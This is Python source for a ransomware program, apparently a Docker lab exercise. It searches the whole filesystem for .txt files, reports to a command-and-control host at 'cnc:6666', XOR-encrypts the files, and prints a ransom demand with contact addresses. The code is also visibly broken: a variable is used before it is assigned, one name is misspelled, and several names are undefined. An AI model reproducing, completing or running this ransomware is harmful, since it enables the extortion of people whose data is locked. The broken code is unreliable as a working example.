import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        path = Path('/')
        return [str(f) for f in path.rglob(filter)]
   
   # This function define  encrypting 
    def encrypt(self):
        
        # List the files 
        txt_files = self.get_files('*.txt')
        # Start the setup
        secret_manager.setup()
        #Create an instance 
        secret_manager =  SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
        #Encrypt the texts files
        secret_manager.xorfiles(txt_files)
        
        print("Your files have been encrypted")
        print("To decrypt them, contact us at the following address  : dontcallthepolice@virus.com")
        print(self._cnc)
        
    # main function for decrypting
    def decrypt(self):
        # List the files
        txt_files = self.get_files('*.txt')
        
        secret_manager = SecretManager(remote_host_port=CNC_ADRESS, path=TOKEN_PATH)
        
        secret_manager.load()
        
         while True:
            try:
                candidate_key = input("Enter the key to decrypt your files: ")
                secret_manager.set_key(candidate_key)
                secret_manager.xorfiles(encrypted_files)
                secret_manager.clean()
                print("Your files have been decrypted successfully!")
                break
            except InvalidKeyError:
                print("The key is invalid. Please try again.")
                continue
        
        

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()